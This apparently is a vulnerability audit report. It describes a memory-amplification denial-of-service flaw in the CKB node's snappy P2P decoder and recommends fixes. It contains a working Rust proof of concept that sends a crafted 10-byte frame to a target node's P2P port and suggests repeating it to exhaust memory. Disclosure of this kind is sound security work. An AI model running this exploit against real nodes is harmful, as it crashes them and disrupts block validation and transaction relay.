Audit Report

## Title
Attacker-Controlled Snappy Decompressed-Length Causes Amplified Memory Allocation in P2P Decoder — (`network/src/compress.rs`)

## Summary

`LengthDelimitedCodecWithCompress::decode` reads the attacker-supplied snappy varint header to obtain a decompressed length, then immediately allocates a zeroed buffer of that size before any decompression is attempted. The only guard is a ceiling of 8 MB (`MAX_UNCOMPRESSED_LEN = 1 << 23`), so a 10-byte wire frame can force an 8 MB heap allocation. Repeated across many concurrent connections this exhausts node memory and crashes the process.

## Finding Description

The root cause is in `network/src/compress.rs` at `LengthDelimitedCodecWithCompress::decode` (lines 219–262).

**Step-by-step exploit path:**

1. The outer `length_delimited.decode(src)?` (line 226) enforces `max_frame_length` on the **compressed** wire frame only. A frame of 6 bytes satisfies every protocol's limit.
2. If `data[0] & COMPRESS_FLAG != 0` (line 232), `decompress_len(&data[1..])` (line 233) reads the varint-encoded uncompressed length directly from the attacker-supplied snappy stream header.
3. The sole guard at line 235 is `decompressed_bytes_len > MAX_UNCOMPRESSED_LEN` (8 MB). Any value ≤ 8 MB passes unconditionally.
4. Line 242 executes `let mut buf = BytesMut::zeroed(decompressed_bytes_len);` — a full heap allocation — before any decompression is attempted.
5. `SnapDecoder::new().decompress(…)` then fails because the payload is malformed; the connection is dropped, but the 8 MB allocation has already occurred and is not reclaimed until the frame is dropped.

Additionally, the decoder never checks `self.enable_compress` before entering the decompression branch (lines 232–255). The branch is gated solely on the flag byte in the received data, meaning even protocols configured with compression disabled are reachable via this path.

The codec is wired into every CKB P2P protocol through `CKBProtocol::build` (`network/src/protocols/mod.rs`, lines 280–288), and `CKBProtocol::new_with_support_protocol` sets `compress: true` by default (line 219). All standard protocols (Sync, RelayV3, LightClient, etc.) are therefore exposed.

The per-protocol `max_frame_length` values in `support_protocols.rs` (lines 122–137) cap only the compressed wire frame, not the attacker-supplied decompressed-length varint embedded in the snappy header. These caps provide no protection against this attack.

## Impact Explanation

**High — Vulnerabilities which could easily crash a CKB node.**

Each malformed frame forces one 8 MB `BytesMut::zeroed` allocation before the connection is dropped. An attacker holding O(N) concurrent inbound connections (N = CKB's default inbound peer limit) accumulates O(N × 8 MB) of live heap allocations simultaneously. Because the attacker can reconnect immediately after disconnection (using multiple IPs or rotating peer slots), allocations can be triggered in a tight loop. On a node with limited RAM this causes the OS OOM killer to terminate the `ckb` process, halting block validation and transaction relay.

## Likelihood Explanation

The entry point is the public P2P TCP port, reachable by any unprivileged peer with no authentication, no prior state, and no special capability. The crafted frame is 10 bytes and trivially constructed. The attacker must only satisfy the per-protocol `max_frame_length` check on the compressed frame (easily done by sending a frame well within the limit) while embedding a snappy header that claims the maximum decompressed size. This is straightforward to automate and repeatable at high frequency.

## Recommendation

1. **Remove the `decompress_len` pre-allocation.** Use `snap::raw::Decoder::decompress_vec` (which allocates only after successful decompression) instead of pre-allocating a zeroed buffer based on the header value.
2. **Alternatively**, cap `decompressed_bytes_len` to `self.length_delimited.max_frame_length()` before allocating, since a legitimately compressed message cannot decompress to more than the protocol's own maximum uncompressed message size.
3. **Check `self.enable_compress`** in the decode path before entering the decompression branch, so protocols with compression disabled reject frames with the compress flag set.
4. **Rate-limit or ban peers** that repeatedly trigger `InvalidData` errors on the compressed path.

## Proof of Concept

```rust
// Attacker: connect to any CKB P2P port and send one crafted frame.
use std::io::Write;
use std::net::TcpStream;

fn main() {
    let mut stream = TcpStream::connect("TARGET:8115").unwrap();

    // snappy raw varint encoding of 8_388_608 (= 1 << 23 = MAX_UNCOMPRESSED_LEN)
    let varint_8mb: &[u8] = &[0x80, 0x80, 0x80, 0x04];

    // frame body: compress_flag (0x80) + varint + 1 pad byte = 6 bytes
    let mut frame_body = vec![0x80u8]; // COMPRESS_FLAG
    frame_body.extend_from_slice(varint_8mb);
    frame_body.push(0x00);

    // 4-byte big-endian length prefix (LengthDelimitedCodec default)
    let len = frame_body.len() as u32;
    stream.write_all(&len.to_be_bytes()).unwrap();
    stream.write_all(&frame_body).unwrap();

    // CKB node executes BytesMut::zeroed(8_388_608) at compress.rs:242,
    // then fails decompression and drops the connection.
    // Repeat across all inbound peer slots to exhaust node memory.
    println!("Sent {} bytes, forced 8 MB allocation on target.", 4 + frame_body.len());
}
```

impl tokio_util::codec::Decoder for LengthDelimitedCodecWithCompress {
    type Item = BytesMut;
    type Error = io::Error;
    fn decode(&mut self, src: &mut BytesMut) -> Result<Option<BytesMut>, io::Error> {
        if src.is_empty() {
            return Ok(None);
        }
        match self.length_delimited.decode(src)? {
            Some(mut data) => {
                if data.len() < 2 {
                    return Err(io::ErrorKind::InvalidData.into());
                }

                if (data[0] & COMPRESS_FLAG) != 0 {
                    match decompress_len(&data[1..]) {
                        Ok(decompressed_bytes_len) => {
                            if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {
                                debug!(
                                    "The limit for uncompressed bytes len is exceeded. limit: {}, len: {}",
                                    MAX_UNCOMPRESSED_LEN, decompressed_bytes_len
                                );
                                return Err(io::ErrorKind::InvalidData.into());
                            }
                            let mut buf = BytesMut::zeroed(decompressed_bytes_len);
                            match SnapDecoder::new().decompress(&data[1..], &mut buf) {
                                Ok(_) => Ok(Some(buf)),
                                Err(e) => {
                                    debug!("snappy decompress error: {:?}", e);
                                    Err(io::ErrorKind::InvalidData.into())
                                }
                            }
                        }
                        Err(e) => {
                            debug!("snappy decompress_len error: {:?}", e);
                            Err(io::ErrorKind::InvalidData.into())
                        }
                    }
                } else {
                    Ok(Some(data.split_off(1)))
                }
            }
            None => Ok(None),
        }
    }
